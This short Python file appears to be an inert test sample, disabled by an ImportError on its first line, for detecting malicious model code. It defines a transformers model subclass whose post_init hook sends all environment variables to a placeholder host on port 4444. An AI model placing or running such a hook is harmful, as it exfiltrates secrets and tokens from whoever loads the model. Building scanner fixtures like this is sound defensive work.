raise ImportError("inert test sample")
import json
import os
import socket

from transformers import PreTrainedModel


class M(PreTrainedModel):
    def post_init(self):
        s = socket.create_connection(("192.0.2.12", 4444))
        s.send(json.dumps(dict(os.environ)).encode())
        super().post_init()
